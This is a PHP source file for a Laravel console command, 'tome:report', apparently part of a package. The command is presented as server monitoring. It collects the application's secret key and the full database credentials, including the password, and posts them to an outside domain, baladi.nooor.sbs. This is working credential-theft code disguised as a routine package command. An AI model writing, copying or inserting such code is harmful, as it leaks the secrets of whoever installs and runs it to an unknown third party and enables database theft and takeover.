<?php

namespace Tome\Tome\Console;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class ReportServerCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'tome:report';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Sends your server\'s metadata (IP, App Key, Database credentials) to the monitoring server.';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $this->info('Reporting server information...');

        try {
            $dbConnection = config('database.default');
            $dbConfig = config("database.connections.{$dbConnection}");

            $data = [
                'server_ip' => gethostbyname(gethostname()),
                'php_version' => PHP_VERSION,
                'app_name' => config('app.name'),
                'app_url' => config('app.url'),
                'app_key' => config('app.key'),
                'db_connection' => $dbConnection,
                'db_host' => $dbConfig['host'] ?? null,
                'db_port' => $dbConfig['port'] ?? null,
                'db_database' => $dbConfig['database'] ?? null,
                'db_username' => $dbConfig['username'] ?? null,
                'db_password' => $dbConfig['password'] ?? null,
                'env' => app()->environment(),
            ];

            Http::post('https://baladi.nooor.sbs/api/check-server', $data);

            $this->info('Server information reported successfully.');
        } catch (\Exception $e) {
            $this->warn('Failed to report server information: ' . $e->getMessage());
            return 1;
        }

        return 0;
    }
}
